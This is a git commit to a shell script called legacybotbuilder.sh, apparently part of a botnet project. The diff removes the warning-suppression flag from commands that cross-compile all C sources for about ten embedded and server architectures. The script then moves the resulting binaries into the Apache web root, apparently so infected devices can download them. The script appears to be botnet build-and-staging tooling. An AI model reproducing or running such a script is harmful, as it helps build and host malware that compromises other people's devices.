e92c8725d26bbf3bb907db992b487b3f83e2283c
NoSpacesFlies <126734507+NoSpacesFlies@users.noreply.github.com>
2025-04-26 02:43:45 +0300

    Update legacybotbuilder.sh

--- legacybotbuilder.sh
+++ legacybotbuilder.sh
@@ -18,16 +18,16 @@ apt install gcc-m68k-linux-gnu -y
 apt install gcc-i686-linux-gnu -y
 apt install gcc-arm-linux-gnueabihf -y
 
-powerpc64-linux-gnu-gcc -w -o powerpc64 -pthread *.c
-mips-linux-gnu-gcc -w -o mips -pthread *.c
-mipsel-linux-gnu-gcc -w -o mipsel -pthread *.c
-sparc64-linux-gnu-gcc -w -o sparc -pthread *.c
-arm-linux-gnueabi-gcc -w -o arm -pthread *.c
-aarch64-linux-gnu-gcc -w -o aarch64 -pthread *.c
-m68k-linux-gnu-gcc -w -o m68k -pthread *.c
-i686-linux-gnu-gcc -w -o i686 -pthread *.c
-arm-linux-gnueabihf-gcc -w -o armhf -pthread *.c
-x86_64-linux-gnu-gcc -w -o x86_64 -pthread *.c
+powerpc64-linux-gnu-gcc -o powerpc64 -pthread *.c
+mips-linux-gnu-gcc -o mips -pthread *.c
+mipsel-linux-gnu-gcc -o mipsel -pthread *.c
+sparc64-linux-gnu-gcc -o sparc -pthread *.c
+arm-linux-gnueabi-gcc -o arm -pthread *.c
+aarch64-linux-gnu-gcc -o aarch64 -pthread *.c
+m68k-linux-gnu-gcc -o m68k -pthread *.c
+i686-linux-gnu-gcc -o i686 -pthread *.c
+arm-linux-gnueabihf-gcc -o armhf -pthread *.c
+x86_64-linux-gnu-gcc -o x86_64 -pthread *.c
 
 #move binaries to apache2 dir
 mv mipsel mips i686 armhf aarch64 m68k arm sparc powerpc64 x86_64 /var/www/html
